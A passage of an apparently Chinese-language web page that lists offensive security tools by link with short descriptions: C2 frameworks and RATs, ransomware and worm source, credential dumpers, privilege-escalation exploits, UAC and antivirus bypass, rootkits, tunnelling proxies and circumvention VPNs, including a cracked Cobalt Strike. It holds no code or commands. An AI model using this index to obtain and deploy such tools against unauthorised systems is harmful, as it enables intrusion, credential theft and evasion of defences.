href="https://github.com/nccgroup/redsnarf">https://github.com/nccgroup/redsnarf</a> 窃取哈希，密码解密，偷偷调用猕猴桃等程序，rdp 多方法利用，远程启动 shell，清楚痕迹</p></li><li><p><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a> 用于分析域成员和用用户关系的程序，通过用 powershell 脚本导出域内的 session、computer、group、user 等信息，入库后进行可视化分析可以做到定点攻击。</p></li><li><p><a href="https://github.com/xorrior/RemoteRecon">https://github.com/xorrior/RemoteRecon</a> 利用 DotNetToJScript 进行截图、key 记录、token 窃取、dll 与恶意代码注入</p></li><li><p><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a> 利用浏览器漏洞当对方打开网址时，扫描对方内网信息</p></li><li><p><a href="https://github.com/fdiskyou/hunter">https://github.com/fdiskyou/hunter</a> 调用 Windows API 对内网信息进行搜集很全面</p></li><li><p><a href="https://github.com/0xwindows/VulScritp">https://github.com/0xwindows/VulScritp</a> 内网渗透脚本，包括 banner 扫描、端口扫描；phpmyadmin、jenkins 等通用漏洞利用等</p></li><li><p><a href="https://github.com/lcatro/network_backdoor_scanner">https://github.com/lcatro/network_backdoor_scanner</a> 基于网络流量的内网探测框架</p></li><li><p><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a> 详细的内部网络信息扫描器</p></li><li><p><a href="https://github.com/rootlabs/nWatch">https://github.com/rootlabs/nWatch</a> 联动 nmap，并对组织内网进行扫描</p></li><li><p><a href="https://github.com/m8r0wn/nullinux">https://github.com/m8r0wn/nullinux</a> 用于 Linux 的内部渗透测试工具，可用于通过 SMB 枚举操作系统信息，域信息，共享，目录和用户。</p></li><li><p><a href="https://github.com/zMarch/Orc">https://github.com/zMarch/Orc</a> bash，Linux 下后渗透命令集合</p></li></ul><h2 id="远程控制-C2-服务器"><a href="#远程控制-C2-服务器" class="headerlink" title="远程控制 C2 服务器#"></a><strong>远程控制 C2 服务器</strong>#</h2><ul><li><p><a href="https://github.com/malwaredllc/byob">https://github.com/malwaredllc/byob</a> 僵尸网络生成框架</p></li><li><p><a href="https://github.com/proxycannon/proxycannon-ng">https://github.com/proxycannon/proxycannon-ng</a> 构建攻击僵尸网络</p></li><li><p><a href="https://github.com/deadPix3l/CryptSky/">https://github.com/deadPix3l/CryptSky/</a> 勒索软件 poc</p></li><li><p><a href="https://github.com/jgamblin/Mirai-Source-Code">https://github.com/jgamblin/Mirai-Source-Code</a> 蠕虫病毒 poc</p></li><li><p><a href="https://github.com/AhMyth/AhMyth-Android-RAT">https://github.com/AhMyth/AhMyth-Android-RAT</a> 基于 smali，Windows 下安卓远控，一对多带界面</p></li><li><p><a href="https://github.com/ssooking/cobaltstrike3.12_cracked">https://github.com/ssooking/cobaltstrike3.12_cracked</a> java1.8，远控、钓鱼、内网</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/ThunderShell">https://github.com/Mr-Un1k0d3r/ThunderShell</a> py2，CLI 与 web 端，内存马，RC4 加密 HTTP 传输</p></li><li><p><a href="https://github.com/tiagorlampert/CHAOS">https://github.com/tiagorlampert/CHAOS</a> go，win 远控，可过大部分杀软</p></li><li><p><a href="https://github.com/Ne0nd0g/merlin">https://github.com/Ne0nd0g/merlin</a> go，c2 通讯，一对多</p></li><li><p><a href="https://github.com/0x09AL/Browser-C2">https://github.com/0x09AL/Browser-C2</a> go，利用 chrome 以浏览器的形式连接 C2 服务器</p></li><li><p><a href="https://github.com/xdnice/PCShare">https://github.com/xdnice/PCShare</a> c++，可以监视目标机器屏幕、注册表、文件系统等</p></li><li><p><a href="https://github.com/quasar/QuasarRAT">https://github.com/quasar/QuasarRAT</a> c#，一对多，界面</p></li><li><p><a href="https://github.com/TheM4hd1/Vayne-RaT">https://github.com/TheM4hd1/Vayne-RaT</a> c#，一对多，界面</p></li><li><p><a href="https://github.com/nettitude/PoshC2">https://github.com/nettitude/PoshC2</a> PowerShell、C#，远控工具，有 win 提权组件</p></li><li><p><a href="https://github.com/euphrat1ca/njRAT-v0.7d">https://github.com/euphrat1ca/njRAT-v0.7d</a> vb，常见蠕虫远控，有很多变种，一对多带界面</p></li><li><p><a href="https://github.com/zerosum0x0/koadic">https://github.com/zerosum0x0/koadic</a> py3,利用 JScript/VBScript 进行控制，大宝剑</p></li><li><p><a href="https://github.com/Ridter/MyJSRat">https://github.com/Ridter/MyJSRat</a> py2，利用 js 后门，配合 chm、hta 可实现很多后门方式。evi1cg.me/archives/chm_backdoor.html</p></li><li><p><a href="https://github.com/its-a-feature/Apfell">https://github.com/its-a-feature/Apfell</a> py3，macOS 与 linux 下的利用 js 后门，web 界面管理</p></li><li><p><a href="https://github.com/peterpt/fuzzbunch">https://github.com/peterpt/fuzzbunch</a> py2，NSA 漏洞利用工具，配有自动化安装脚本与 gui 界面，远控 rat</p></li><li><p><a href="https://github.com/n1nj4sec/pupy">https://github.com/n1nj4sec/pupy</a> py，Windows, Linux, OSX, Android 跨平台，一对多</p></li><li><p><a href="https://github.com/nathanlopez/Stitch">https://github.com/nathanlopez/Stitch</a> py，Windows、Mac OSX、Linux 跨平台</p></li><li><p><a href="https://github.com/neoneggplant/EggShell">https://github.com/neoneggplant/EggShell</a> py，macos/osx 远控,可生成 HID 代码，一对多</p></li><li><p><a href="https://github.com/Marten4n6/EvilOSX">https://github.com/Marten4n6/EvilOSX</a> py，macos/osx 远控，一对多</p></li><li><p><a href="https://github.com/vesche/basicRAT">https://github.com/vesche/basicRAT</a> py3，simple 远控，一对多</p></li><li><p><a href="https://github.com/Viralmaniar/Powershell-RAT">https://github.com/Viralmaniar/Powershell-RAT</a> py，截图通过 gmail 传输</p></li><li><p><a href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a> py，使用 gmail 作为 C&amp;C 服务器</p></li><li><p><a href="https://github.com/sweetsoftware/Ares">https://github.com/sweetsoftware/Ares</a> py，c2 通讯，支持代理</p></li><li><p><a href="https://github.com/micle-fm/Parat">https://github.com/micle-fm/Parat</a> py，利用 telegram，windows 下的远程控制工具</p></li><li><p><a href="https://github.com/ahhh/Reverse_DNS_Shell">https://github.com/ahhh/Reverse_DNS_Shell</a> py，通过 dns 传输</p></li><li><p><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a> 服务端为 ruby（linux），客户端为 C（win/linux），利用 DNS 协议进行端对端传输</p></li><li><p><a href="https://github.com/deepzec/Grok-backdoor">https://github.com/deepzec/Grok-backdoor</a> py，利用 ngrok 的后门</p></li><li><p><a href="https://github.com/trustedsec/trevorc2">https://github.com/trustedsec/trevorc2</a> py，搭建一个合法的网站（可浏览），用于隐藏命令执行的客户端/服务器通信</p></li></ul><h2 id="端口转发与代理工具"><a href="#端口转发与代理工具" class="headerlink" title="端口转发与代理工具#"></a><strong>端口转发与代理工具</strong>#</h2><ul><li><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a> 用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议</p></li><li><p><a href="https://github.com/inconshreveable/ngrok">https://github.com/inconshreveable/ngrok</a> 端口转发，正反向代理，内网穿透</p></li><li><p><a href="http://ngrok.ciqiuwl.cn/">http://ngrok.ciqiuwl.cn/</a> 在线小米球 ngrok</p></li><li><p><a href="https://github.com/knownsec/rtcp">https://github.com/knownsec/rtcp</a> Socket 端口转发，用于远程维护</p></li><li><p><a href="https://github.com/davrodpin/mole">https://github.com/davrodpin/mole</a> 基于 ssh 的端口转发</p></li><li><p><a href="http://rootkiter.com/EarthWorm">http://rootkiter.com/EarthWorm</a> 一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。</p></li><li><p><a href="http://rootkiter.com/Termite/README.txt">http://rootkiter.com/Termite/README.txt</a> EarthWorm 升级版，可以实现多节点跳跃</p></li><li><p><a href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a> 可以通过 HTTP 封装隧道通信任何 TCP，以及用于绕过防火墙环境中的网络限制</p></li><li><p><a href="https://github.com/fbkcs/thunderdns">https://github.com/fbkcs/thunderdns</a> 将 tcp 流量通过 DNS 协议转发，不需要客户端和 socket5 支持</p></li><li><p><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a> reDuh 的升级版，主要是把内网服务器的端口通过 http/https 隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口（提供了 php，asp，jsp 脚本的正反向代理）</p></li><li><p><a href="https://github.com/SpiderClub/haipproxy">https://github.com/SpiderClub/haipproxy</a> py3,Scrapy and Redis,高可用 ip 代理池</p></li><li><p><a href="https://github.com/chenjiandongx/async-proxy-pool">https://github.com/chenjiandongx/async-proxy-pool</a> py3 异步爬虫 ip 代理池</p></li><li><p><a href="https://github.com/audibleblink/doxycannon">https://github.com/audibleblink/doxycannon</a> 使用一个 openvpn 代理池，为每一个生成 docker，当连接某一个 vpn 后，其它的进行 socks5 转发做流量分发</p></li><li><p><a href="https://github.com/decoder-it/psportfwd">https://github.com/decoder-it/psportfwd</a> PowerShell 编写的端口转发工具, 无需 admin 权限</p></li><li><p><a href="https://github.com/ls0f/gortcp">https://github.com/ls0f/gortcp</a> go，通过主控端、中转、被控端实现内网穿透</p></li></ul><h2 id="Cross-超越边界-NPV"><a href="#Cross-超越边界-NPV" class="headerlink" title="Cross 超越边界 NPV#"></a><strong>Cross 超越边界 NPV</strong>#</h2><ul><li><p><a href="https://github.com/bannedbook/fanqiang/wiki">https://github.com/bannedbook/fanqiang/wiki</a> cross 汇总</p></li><li><p><a href="https://github.com/teddysun/across">https://github.com/teddysun/across</a> 梯子搭建</p></li><li><p><a href="https://github.com/ToyoDAdoubi/doubi">https://github.com/ToyoDAdoubi/doubi</a> 各种常用一键脚本</p></li><li><p><a href="https://github.com/Nyr/openvpn-install">https://github.com/Nyr/openvpn-install</a> openvpn 一键</p></li><li><p><a href="https://github.com/quericy/one-key-ikev2-vpn">https://github.com/quericy/one-key-ikev2-vpn</a> CentOS/Debian/Ubuntu 一键安装 IPSEC/IKEV2 VPN 脚本</p></li><li><p><a href="https://github.com/teddysun/shadowsocks_install">https://github.com/teddysun/shadowsocks_install</a> shadowsocks,shadowsocksr</p></li><li><p><a href="https://github.com/guyingbo/shadowproxy">https://github.com/guyingbo/shadowproxy</a> ss/socks5/http//https 等多种代理</p></li><li><p><a href="https://github.com/shadowsocks/shadowsocks-manager">https://github.com/shadowsocks/shadowsocks-manager</a> shadowsocks 多用户管理</p></li><li><p><a href="https://github.com/leitbogioro/SSR.Go">https://github.com/leitbogioro/SSR.Go</a> shadowsocksrr 配置管理简化工具</p></li><li><p><a href="https://github.com/ssrpanel/SSRPanel">https://github.com/ssrpanel/SSRPanel</a> ss\ssr\v2ray 用户分布式管理</p></li><li><p><a href="https://github.com/xuanhuan/ss-panel">https://github.com/xuanhuan/ss-panel</a> ss 用户分布式管理</p></li><li><p><a href="https://github.com/Ahref-Group/SS-Panel-smarty-Edition">https://github.com/Ahref-Group/SS-Panel-smarty-Edition</a> ss 用户分布式管理，兑换码功能、商城系统，服务器信息</p></li><li><p><a href="https://github.com/Ccapton/brook-web">https://github.com/Ccapton/brook-web</a> brook 程序服务端 Web 后台管理服务器（Linux|MacOS），基于 python、flask、flask-restful</p></li><li><p><a href="https://github.com/Ccapton/brook-ok">https://github.com/Ccapton/brook-ok</a> Brook 一键安装脚本</p></li><li><p><a href="https://github.com/txthinking/brook">https://github.com/txthinking/brook</a> go，支持 Linux/MacOS/Windows/Android/iOS 的代理与 vpn</p></li><li><p><a href="https://github.com/gwuhaolin/lightsocks">https://github.com/gwuhaolin/lightsocks</a> 轻量级网络混淆代理，基于 SOCKS5 协议，类 SS</p></li><li><p><a href="https://github.com/Umbrellazc/BypassCampusNet">https://github.com/Umbrellazc/BypassCampusNet</a> 校园网防断网; UDP 53 免流上网</p></li><li><p><a href="https://doub.io/dbrj-5/">https://doub.io/dbrj-5/</a> 通过虚拟网卡转为类 VPN 全局代理 SSTAP，还有 sockscap64，比 proxifier 使用简单</p></li><li><p><a href="https://github.com/ntkernel/lantern">https://github.com/ntkernel/lantern</a> unlimited-landeng-for-win，无限流量蓝灯</p></li><li><p><a href="https://www.psiphon3.com/">https://www.psiphon3.com</a> 开源赛风超越边界代理</p></li><li><p><a href="https://hide.me/">https://hide.me</a> 可试用</p></li><li><p><a href="https://windscribe.com/">https://windscribe.com</a> 可试用</p></li><li><p><a href="http://www.vpngate.net/">http://www.vpngate.net</a> 日本国立筑波大学超越边界代理</p></li><li><p><a href="https://rava.app/">https://rava.app</a> 注册可免费用一天</p></li></ul><h2 id="横向移动与密码-Hash-窃取"><a href="#横向移动与密码-Hash-窃取" class="headerlink" title="横向移动与密码 Hash 窃取#"></a><strong>横向移动与密码 Hash 窃取</strong>#</h2><ul><li><p><a href="http://www.oxid.it/cain.html">http://www.oxid.it/cain.html</a> Cain &amp; Abel 支持密码还原、arp 中间人攻击</p></li><li><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a> Windows 下以抓取密码为主的横向移动神器</p></li><li><p><a href="https://github.com/skelsec/pypykatz">https://github.com/skelsec/pypykatz</a> 使用纯 py3 实现的 mimikatz</p></li><li><p><a href="https://github.com/eladshamir/Internal-Monologue">https://github.com/eladshamir/Internal-Monologue</a> 无需 LSASS 进程使用 Mimikatz 从 LSASS 进程内存中提取内容, 从内存中提取明文密码, NTLM 哈希, Kerberos ticket, 以及执行 pass-the-hash/pass-the-ticket 攻击等</p></li><li><p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a> py3，密码抓取工具</p></li><li><p><a href="https://github.com/AlessandroZ/LaZagneForensic">https://github.com/AlessandroZ/LaZagneForensic</a> LaZagne 密码破解升级版，利用 DPAPI，目前缺陷是需要 windows user 密码</p></li><li><p><a href="https://github.com/twelvesec/passcat">https://github.com/twelvesec/passcat</a> Windows 下密码抓取工具</p></li><li><p><a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a> linux 密码抓取神器</p></li><li><p><a href="https://github.com/quarkslab/quarkspwdump">https://github.com/quarkslab/quarkspwdump</a> quarkslab 出品的密码抓取工具，不用注入任何进程</p></li><li><p><a href="https://github.com/mthbernardes/sshLooter">https://github.com/mthbernardes/sshLooter</a> 从 ssh 服务中窃取用户名密码</p></li><li><p><a href="https://github.com/nettitude/Invoke-PowerThIEf">https://github.com/nettitude/Invoke-PowerThIEf</a> 利用 IE 进行后渗透，抓取密码、重定向等</p></li><li><p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a> 操作 Kerberos 的库, 实现了 Kekeo 的大部分功能, C#编写</p></li><li><p><a href="https://github.com/m8r0wn/ldap_search">https://github.com/m8r0wn/ldap_search</a> PY,通过 ldap（轻量目录访问协议）认证，列举 win 域信息，爆破登录</p></li></ul><h2 id="Linux-提权相关"><a href="#Linux-提权相关" class="headerlink" title="Linux 提权相关#"></a><strong>Linux 提权相关</strong>#</h2><ul><li><p><a href="https://github.com/AlessandroZ/BeRoot">https://github.com/AlessandroZ/BeRoot</a> py,通过检查常见的错误配置来查找提权方法. 支持 Windows/Linux/Mac</p></li><li><p><a href="https://github.com/mschwager/0wned">https://github.com/mschwager/0wned</a> 利用 python 包进行高权限用户创建</p></li><li><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a> 查找 linux 有哪些补丁没有打的脚本</p></li><li><p><a href="https://github.com/belane/linux-soft-exploit-suggester">https://github.com/belane/linux-soft-exploit-suggester</a> 查找 linux 有哪些有漏洞的软件</p></li><li><p><a href="https://github.com/dirtycow/dirtycow.github.io">https://github.com/dirtycow/dirtycow.github.io</a> 脏牛提权漏洞 exp</p></li><li><p><a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a> 脏牛提权漏洞 exp</p></li><li><p><a href="https://github.com/stanleyb0y/sushell">https://github.com/stanleyb0y/sushell</a> 利用 su 小偷实现低权限用户窃取 root 用户口令</p></li><li><p><a href="https://github.com/jas502n/CVE-2018-17182/">https://github.com/jas502n/CVE-2018-17182/</a> Linux 内核 VMA-UAF 提权漏洞 CVE-2018-17182</p></li><li><p><a href="https://github.com/jas502n/CVE-2018-14665">https://github.com/jas502n/CVE-2018-14665</a> CVE-2018-14665，linux 下 Xorg X 服务器提权利用</p></li><li><p><a href="https://github.com/nmulasmajic/syscall_exploit_CVE-2018-8897">https://github.com/nmulasmajic/syscall_exploit_CVE-2018-8897</a> Linux 系统利用 Syscall 实现提权</p></li><li><p><a href="https://github.com/can1357/CVE-2018-8897">https://github.com/can1357/CVE-2018-8897</a> Linux 系统利用 Syscall 实现提权</p></li><li><p><a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a> linux-kernel-exploits Linux 平台提权漏洞集合</p></li><li><p><a href="https://github.com/nilotpalbiswas/Auto-Root-Exploit">https://github.com/nilotpalbiswas/Auto-Root-Exploit</a> linux 自动提权脚本</p></li><li><p><a href="https://github.com/WazeHell/PE-Linux">https://github.com/WazeHell/PE-Linux</a> Linux 提权工具</p></li><li><p><a href="https://guif.re/linuxeop">https://guif.re/linuxeop</a> linux 提权命令集合</p></li></ul><h2 id="Windows-提权相关"><a href="#Windows-提权相关" class="headerlink" title="Windows 提权相关#"></a><strong>Windows 提权相关</strong>#</h2><ul><li><p><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a> windows 平台教程级提权参考文章</p></li><li><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a> Windows 平台提权漏洞 Exp 集合</p></li><li><p><a href="https://github.com/51x/WHP">https://github.com/51x/WHP</a> windows 下各种提权与利用工具</p></li><li><p><a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a> win 提权漏洞验证</p></li><li><p><a href="https://github.com/WindowsExploits/Exploits">https://github.com/WindowsExploits/Exploits</a> 微软 CVE-2012-0217、CVE-2016-3309、CVE-2016-3371、CVE-2016-7255、CVE-2017-0213 提权利用</p></li><li><p><a href="https://github.com/decoder-it/lonelypotato">https://github.com/decoder-it/lonelypotato</a> RottenPotatoNG 变种，利用 NBNS 本地域名欺骗和 WPAD 代理欺骗提权</p></li><li><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a> RottenPotatoNG 变种，利用 com 对象、用户 token 进行提权</p></li><li><p><a href="https://github.com/foxglovesec/Potato">https://github.com/foxglovesec/Potato</a> RottenPotatoNG 变种，利用本地域名欺骗和代理欺骗提权</p></li><li><p><a href="https://github.com/DanMcInerney/icebreaker">https://github.com/DanMcInerney/icebreaker</a> 处于内网环境但又在 AD 环境之外，icebreaker 将会帮助你获取明文 Active Directory 凭据（活动目录存储在域控服务器可用于提权）</p></li><li><p><a href="https://github.com/hausec/ADAPE-Script">https://github.com/hausec/ADAPE-Script</a> Active Directory 权限提升脚本</p></li><li><p><a href="https://github.com/klionsec/BypassAV-AllThings">https://github.com/klionsec/BypassAV-AllThings</a> 利用 aspx 一句话配合提权 payload 提权</p></li><li><p><a href="https://github.com/St0rn/Windows-10-Exploit">https://github.com/St0rn/Windows-10-Exploit</a> msf 插件，win10 uac bypass</p></li><li><p><a href="https://github.com/sam-b/CVE-2014-4113">https://github.com/sam-b/CVE-2014-4113</a> 利用 Win32k.sys 内核漏洞进行提取，ms14-058</p></li><li><p><a href="https://github.com/breenmachine/RottenPotatoNG">https://github.com/breenmachine/RottenPotatoNG</a> 利用 NBNS 本地域名欺骗和 WPAD 代理欺骗提权</p></li><li><p><a href="https://github.com/unamer/CVE-2018-8120">https://github.com/unamer/CVE-2018-8120</a> 影响 Win32k 组件，针对 win7 和 win2008 提权</p></li><li><p><a href="https://github.com/alpha1ab/CVE-2018-8120">https://github.com/alpha1ab/CVE-2018-8120</a> 在 win7 与 win2k8 的基础上增加了 winXP 与 win2k3</p></li><li><p><a href="https://github.com/0xbadjuju/Tokenvator">https://github.com/0xbadjuju/Tokenvator</a> 使用 Windows 令牌提升权限的工具，提供一个交互命令行界面</p></li></ul><h2 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过#"></a><strong>权限绕过</strong>#</h2><ul><li><p><a href="https://payloads.online/archivers/2018-12-22/1">https://payloads.online/archivers/2018-12-22/1</a> DLL Hijacking &amp; COM Hijacking ByPass UAC - 议题解读</p></li><li><p><a href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a> 能够利用 JS/Vbs 脚本加载.Net 程序的工具</p></li><li><p><a href="https://github.com/mdsecactivebreach/SharpPack">https://github.com/mdsecactivebreach/SharpPack</a> 绕过系统应用白名单执行 DotNet and PowerShell tools</p></li><li><p><a href="https://github.com/rootm0s/WinPwnage">https://github.com/rootm0s/WinPwnage</a> py2，win 下权限提升，uac 绕过，dll 注入等</p></li><li><p><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a> 包含许多用于多个版本操作系统上绕过 Windows 用户帐户控制的方法</p></li><li><p><a href="https://github.com/Ben0xA/nps">https://github.com/Ben0xA/nps</a> 实现了不使用 powershell.exe 的情况下执行 powershell 命令</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/PowerLessShell">https://github.com/Mr-Un1k0d3r/PowerLessShell</a> 实现了不调用 powershell.exe 的情况下执行 powershell 命令</p></li><li><p><a href="https://github.com/p3nt4/PowerShdll">https://github.com/p3nt4/PowerShdll</a> 使用 rundll32 运行 PowerShell，绕过软件限制</p></li><li><p><a href="https://github.com/ionescu007/r0ak">https://github.com/ionescu007/r0ak</a> 内核层的瑞士军刀. 在 Windows10 内核中读/写/执行代码</p></li><li><p><a href="https://github.com/leechristensen/UnmanagedPowerShell">https://github.com/leechristensen/UnmanagedPowerShell</a> 从一个非托管程序来执行 PowerShell,经过一些修改后可以被用来注入到其他进程</p></li><li><p><a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a> 一种库注入技术，让 DLL 自身不使用 LoadLibraryA 函数,将自身映射到目标进程内存中</p></li><li><p><a href="https://github.com/ChrisAD/ads-payload">https://github.com/ChrisAD/ads-payload</a> 利用环境变量与 destop.ini 绕过 windows 下的 Palo Alto Traps endpoint 防护软件</p></li><li><p><a href="https://github.com/Zer0Mem0ry/RunPE">https://github.com/Zer0Mem0ry/RunPE</a> 通过内存读取，网络传输内容，利用 PE 执行 shellcode</p></li></ul><h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸#"></a><strong>沙盒逃逸</strong>#</h2><ul><li><p><a href="https://github.com/hacksysteam/WpadEscape">https://github.com/hacksysteam/WpadEscape</a> 利用 wpad 进行浏览器 sandbox 沙箱逃逸</p></li><li><p><a href="https://github.com/unamer/vmware_escape">https://github.com/unamer/vmware_escape</a> vmware 虚拟机逃逸。CVE-2017-4901，CVE-2018-6981，CVE-2018-6982</p></li><li><p><a href="https://github.com/MorteNoir1/virtualbox_e1000_0day">https://github.com/MorteNoir1/virtualbox_e1000_0day</a> VirtualBox E1000 Guest-to-Host Escape 逃逸。教程</p></li><li><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1682&amp;desc=2">https://bugs.chromium.org/p/project-zero/issues/detail?id=1682&amp;desc=2</a> Ghostscript：基于漏洞 CVE-2018-17961 的-dSAFER 沙盒逃逸技术</p></li></ul><h2 id="后门免杀代码混淆"><a href="#后门免杀代码混淆" class="headerlink" title="后门免杀代码混淆#"></a><strong>后门免杀代码混淆</strong>#</h2><ul><li><p><a href="https://www.shellterproject.com/">https://www.shellterproject.com</a> 杀毒软件绕过</p></li><li><p><a href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a> py，一键生成多种后门</p></li><li><p><a href="https://github.com/islamTaha12/Python-Rootkit">https://github.com/islamTaha12/Python-Rootkit</a> windows 下 rootkit，反弹 meterpreter</p></li><li><p><a href="https://github.com/n00py/Hwacha">https://github.com/n00py/Hwacha</a> linux 下快速生成 metepreter 等多种 payload</p></li><li><p><a href="https://github.com/Screetsec/Vegile">https://github.com/Screetsec/Vegile</a> msf 免杀，程序注入</p></li><li><p><a href="https://github.com/MohamedNourTN/Terminator">https://github.com/MohamedNourTN/Terminator</a> py2，msf 免杀</p></li><li><p><a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a> msf 免杀</p></li><li><p><a href="https://github.com/abedalqaderswedan1/aswcrypter">https://github.com/abedalqaderswedan1/aswcrypter</a> py、bash，msf 免杀</p></li><li><p><a href="https://github.com/Screetsec/TheFatRat">https://github.com/Screetsec/TheFatRat</a> java，msf 免杀，利用 searchsploit 快速搜索</p></li><li><p><a href="https://github.com/pasahitz/zirikatu">https://github.com/pasahitz/zirikatu</a> msf 免杀</p></li><li><p><a href="https://github.com/govolution/avet">https://github.com/govolution/avet</a> msf 免杀</p></li><li><p><a href="https://github.com/GreatSCT/GreatSCT">https://github.com/GreatSCT/GreatSCT</a> msf 免杀</p></li><li><p><a href="https://github.com/EgeBalci/HERCULES">https://github.com/EgeBalci/HERCULES</a> msf 免杀</p></li><li><p><a href="https://github.com/trustedsec/nps_payload">https://github.com/trustedsec/nps_payload</a> msf 免杀</p></li><li><p><a href="https://github.com/4w4k3/Insanity-Framework">https://github.com/4w4k3/Insanity-Framework</a> py，payload 生成，过杀软，识别虚拟机，钓鱼，内存注入等</p></li><li><p><a href="https://github.com/hlldz/SpookFlare">https://github.com/hlldz/SpookFlare</a> Meterpreter，Empire，Koadic 等 loader/dropper 的生成器，可以绕过客户端检测和网络端检测的端点策略</p></li><li><p><a href="https://github.com/pasahitz/regsvr32">https://github.com/pasahitz/regsvr32</a> 使用 C#+Empire 实现最小体积免杀后门</p></li><li><p><a href="https://github.com/malcomvetter/UnstoppableService">https://github.com/malcomvetter/UnstoppableService</a> 将自身安装为 Windows 服务且管理员无法停止/暂停服务的程序. C#编写</p></li><li><p><a href="https://github.com/Cn33liz/StarFighters">https://github.com/Cn33liz/StarFighters</a> 基于 DotNetToJScript，利用 JavaScript 和 VBScript 执行 Empire Launcher</p></li><li><p><a href="https://github.com/mdsecactivebreach/SharpShooter">https://github.com/mdsecactivebreach/SharpShooter</a> 基于 DotNetToJScript 使用 js、vbs，用于检索和执行任意 CSharp 源码的 payload 创建框架</p></li><li><p><a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a> 基于 DotNetToJScript 使用 js、vbs 生成恶意 payload</p></li><li><p><a href="https://github.com/OmerYa/Invisi-Shell">https://github.com/OmerYa/Invisi-Shell</a> 对 powershell 文件进行混淆</p></li><li><p><a href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a> 对 powershell 文件进行混淆，加密操作以及重新编码</p></li><li><p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a> 对 powershell 文件进行混淆，加密操作以及重新编码</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/SCT-obfuscator">https://github.com/Mr-Un1k0d3r/SCT-obfuscator</a> Cobalt Strike SCT 有效载荷混淆器</p></li><li><p><a href="https://github.com/tokyoneon/Armor">https://github.com/tokyoneon/Armor</a> bash，生成加密 Payload 在 macOS 上反弹 Shell</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator">https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator</a> 宏混淆，其中还包括 AV/Sandboxes 逃避机制</p></li><li><p><a href="https://github.com/Kkevsterrr/backdoorme">https://github.com/Kkevsterrr/backdoorme</a> py3、py2 多种类型的后门、shell 生成工具，可以自动维持权限</p></li><li><p><a href="https://github.com/TestingPens/MalwarePersistenceScripts">https://github.com/TestingPens/MalwarePersistenceScripts</a> win 下权限维持脚本</p></li><li><p><a href="https://github.com/mhaskar/Linux-Root-Kit">https://github.com/mhaskar/Linux-Root-Kit</a> py，simple，linux 下 rootkit</p></li><li><p><a href="https://github.com/PinkP4nther/Sutekh">https://github.com/PinkP4nther/Sutekh</a> simple，rootkit，使普通用户获取 root shell</p></li><li><p><a href="https://github.com/threatexpress/metatwin">https://github.com/threatexpress/metatwin</a> 从一个文件中提取元数据，包括数字签名，并注入到另一个文件中</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/Windows-SignedBinary">https://github.com/Mr-Un1k0d3r/Windows-SignedBinary</a> 可以修改二进制文件的 HASH，同时保留微软 windows 的签名</p></li><li><p><a href="https://github.com/secretsquirrel/SigThief">https://github.com/secretsquirrel/SigThief</a> py，用于劫持合法的数字签名并绕过 Windows 的哈希验证机制的脚本工具</p></li><li><p><a href="https://github.com/9aylas/Shortcut-Payload-Generator">https://github.com/9aylas/Shortcut-Payload-Generator</a> 快捷方式(.lnk)文件 Payload 生成器.AutoIt 编写</p></li><li><p><a href="https://github.com/GuestGuri/Rootkit">https://github.com/GuestGuri/Rootkit</a> 反弹一个 tcp 连接，将进程 id 绑定到一个空文件夹</p></li><li><p><a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a> 可以生成 win32PE 后门测试程序,ELF 文件后门程序等</p></li></ul><h2 id="文件捆绑"><a href="#文件捆绑" class="headerlink" title="文件捆绑#"></a><strong>文件捆绑</strong>#</h2><ul><li><p>bat2exe.net 相类似也可以利用 iexpress 与 winrar 生成自解压 